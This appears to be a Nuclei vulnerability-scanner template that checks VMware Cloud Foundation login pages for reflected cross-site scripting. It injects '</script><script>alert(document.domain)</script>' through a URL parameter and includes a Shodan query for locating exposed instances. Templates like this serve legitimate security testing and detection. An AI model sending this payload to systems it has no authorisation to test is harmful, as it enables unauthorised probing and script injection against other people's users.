id: vmware-cloud-xss
info:
  name: VMWare Cloud - Cross Site Scripting
  author: tess
  severity: medium
  description: VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.
  classification:
    cwe-id:
      - CWE-80
    cpe: cpe:2.3:a:vmware:cloud_foundation:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    product: cloud_foundation
    shodan-query: title:"Vmware Cloud"
    vendor: vmware
    verified: true
  tags: cloud,vmware,vuln,xss
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - </script><script>alert(document.domain)</script>
          - let tokens = "
      - part: header
        type: word
        words:
          - text/html
      - status:
          - 200
        # digest: 4b0a00483046022100f25baf8d69223f19279a4ba0fee3458b92b26730fdfca75cb5192891b2ee4b57022100f1f9b27c042c48fad1b071c0e2dcae52ff8d8a4b9dfab10ad0556a470707a27e:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>'
